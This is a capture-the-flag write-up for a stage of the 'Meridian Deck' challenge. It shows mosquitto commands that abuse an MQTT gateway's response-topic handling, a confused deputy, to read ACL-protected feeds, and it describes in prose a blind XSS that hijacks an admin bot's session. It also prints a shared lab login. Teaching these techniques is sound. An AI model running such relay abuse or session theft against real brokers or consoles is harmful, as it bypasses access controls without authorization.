# Meridian Deck 3/5 — Life Support

**Flag:** `reentry{c0nfus3d_g4t3w4y_l34ks_th3_l4z4rus_f33d}`
**Recovered on the way:** relay id `lsu-relay-3391` (needed in stages 4 and 5)

| | |
|---|---|
| Category | MQTT / authorization logic (confused deputy); web blind XSS (dead end) |
| Targets | crew console `http://reentry-...-deck-access-0-0.chals.io` + MQTT broker `mqtt://0.cloud.chals.io:<port>` (offline now) |
| Tools | `mosquitto_sub`/`mosquitto_pub` |
| Files | none |

> **Challenge brief:** The MERIDIAN deck runs its life-support on an MQTT bus — O2, CO2, cabin
> pressure — with a crew web console in front of it. The broker is open to anyone who asks; connect
> and see what it is holding, and what it will do on your behalf. The ops crew keep the console
> dashboard up while they work, so whatever it shows, somebody is looking at it.

Platform hints: (1) there is more than one user and they see different things; (2) the gateway
takes requests — check `meridian/bridge/req/<feed>`.

---

## 1. Recon

### Broker — what it holds (retained)

```bash
H=0.cloud.chals.io; P=13041
mosquitto_sub -h $H -p $P -t '#' -v --retained-only -W 6
```

```
meridian/lifesupport/env/o2 20.9 %
meridian/lifesupport/env/co2 0.31 %
meridian/bridge/catalog lazarus/directive\nlazarus/heartbeat\nlazarus/status
```

`meridian/bridge/catalog` is **one** retained message with a multi-line payload — a list of
relayable feeds, not separate topics. The broker is **anonymous only** (any user/pass →
`Connection Refused: not authorised.`).

### Web console

Routes: `/login`, `/` (dashboard), `/alert` (pages on-call ops), `/admin` (401 for crew). Login is
the shared `crew : meridian-1977` from stage 1. The session cookie has **no HttpOnly** flag, and
the dashboard renders MQTT telemetry values **without HTML escaping** → stored/blind XSS.

---

## 2. Two paths — and which is right

### Dead end: blind XSS → admin session (hint 1)

"More than one user" = `crew` (me) vs `admin` (an on-call ops **bot** triggered by `/alert`).
Publish a `<script>` as a telemetry value (retained), call `POST /alert`, and the bot loads the
dashboard and runs the script in its session (cookie readable, no HttpOnly). This yields the admin
`/admin` page:

```
relay link            lazarus ⇄ records-bridge
registered relay id   lsu-relay-3391
```

But **there is no flag** on `/admin`, `/?flag=true`, or `localStorage`. The XSS only yields the
**relay id `lsu-relay-3391`** (useful for stages 4/5). A dead end for the flag itself.

### Right path: confused deputy on the gateway (hint 2)

- The `lazarus/*` feeds are ACL-protected — as anon you cannot subscribe to them.
- You cannot write to `lazarus/*` or `meridian/bridge/catalog`.
- The gateway is subscribed to `meridian/bridge/req/#` and consumes it, but seems to answer
  nothing.

"The gateway takes requests" + "what it will do **on your behalf**" = **confused deputy**: the
gateway has permissions you lack (it reads `lazarus/*`) and relays a feed's value on request.

**Why it seemed silent:** the gateway replies to the topic in the MQTT5 `response-topic` property,
but it can only publish where it has write-ACL — i.e. under `meridian/lifesupport/env/*`. Default
`mosquitto_rr` points the response at `meridian/bridge/resp/*`, where the gateway cannot write, so
the reply never arrives. Point `response-topic` at `meridian/lifesupport/env/...` and it comes.

---

## 3. Exploit

Terminal A — listen on the response topic (must be under `env/*`):

```bash
H=0.cloud.chals.io; P=13041
mosquitto_sub -h $H -p $P -t 'meridian/lifesupport/env/rr' -v
```

Terminal B — request to the gateway with `response-topic` set:

```bash
mosquitto_pub -h $H -p $P \
  -t 'meridian/bridge/req/lazarus/status' \
  -m 'lsu-relay-3391' \
  -D publish response-topic 'meridian/lifesupport/env/rr'
```

Reply in Terminal A:

```
meridian/lifesupport/env/rr  LAZARUS nominal :: reentry{c0nfus3d_g4t3w4y_l34ks_th3_l4z4rus_f33d}
```

The gateway validates the feed name (`no such MERIDIAN feed: <name>` otherwise), so only the real
`lazarus/{directive,status,heartbeat}` work.

🚩 **Flag:** `reentry{c0nfus3d_g4t3w4y_l34ks_th3_l4z4rus_f33d}`

> **Note:** The MQTT broker and console are offline now (event closed), so this cannot be re-run.
> The relay id `lsu-relay-3391` recovered here is used in [4 - Records Bridge](4%20-%20Records%20Bridge.md).

---

## Why it works / lessons

- **Confused deputy:** a relay service with more privilege than the attacker, which blindly runs
  requests "on their behalf", bypasses the broker ACL.
- **MQTT5 request/response:** the reply goes to `response-topic`, but the relay can only publish
  where its ACL allows. Choosing a response topic in the permitted namespace was the key.
- Not every confirmed bug is the path to the flag — the blind XSS worked but only yielded the relay
  id. Both hints were needed, but hint 2 (the gateway) carried the flag.

> **Previous:** [2 - Last Messages](2%20-%20Last%20Messages.md) · **Next:** [4 - Records Bridge](4%20-%20Records%20Bridge.md)
